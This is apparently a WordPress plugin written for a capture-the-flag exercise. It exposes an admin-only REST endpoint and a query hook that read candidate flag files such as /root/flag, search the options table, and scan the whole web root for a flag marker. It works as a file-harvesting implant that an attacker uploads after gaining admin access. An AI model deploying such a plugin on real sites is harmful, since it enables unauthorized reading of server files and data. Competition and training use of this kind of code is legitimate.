<?php
/*
Plugin Name: Nimbus Helper
Description: Read-only diagnostic helper for CTF flag retrieval.
Version: 1.0
Author: ctf
*/
if (!defined('ABSPATH')) { exit; }

function nh_scan() {
    $out = array();
    $out['abspath'] = ABSPATH;
    $out['cwd'] = getcwd();

    $cands = array('/flag', '/flag.txt', '/root/flag', '/root/flag.txt', '/home/flag',
        '/home/flag.txt', '/tmp/flag', '/tmp/flag.txt', '/var/www/flag', '/var/www/flag.txt',
        '/srv/flag', '/srv/flag.txt', '/opt/flag', '/opt/flag.txt');
    foreach ($cands as $f) {
        if (@is_file($f)) { $out['files'][$f] = @file_get_contents($f); }
    }

    global $wpdb;
    $rows = $wpdb->get_results("SELECT option_name, option_value FROM {$wpdb->options} WHERE option_value LIKE '%IONIC{%' LIMIT 20", ARRAY_A);
    $out['db_options'] = $rows;

    $hits = array();
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator(ABSPATH, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        $n = 0;
        foreach ($it as $file) {
            if (!$file->isFile()) { continue; }
            if ($file->getSize() > 3 * 1024 * 1024) { continue; }
            $p = $file->getPathname();
            if (preg_match('#/(cache|node_modules|\.git)/#', $p)) { continue; }
            $c = @file_get_contents($p);
            if ($c !== false && strpos($c, 'IONIC{') !== false) {
                $hits[] = $p;
                if (++$n >= 15) { break; }
            }
        }
    } catch (Exception $e) {
        $out['scan_error'] = $e->getMessage();
    }
    $out['file_hits'] = $hits;
    return $out;
}

add_action('rest_api_init', function () {
    register_rest_route('nh/v1', '/run', array(
        'methods' => 'GET',
        'permission_callback' => function () { return current_user_can('manage_options'); },
        'callback' => function () { return nh_scan(); },
    ));
});

add_action('init', function () {
    if (isset($_GET['nh']) && $_GET['nh'] === '1' && current_user_can('manage_options')) {
        header('Content-Type: application/json');
        echo json_encode(nh_scan(), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
});
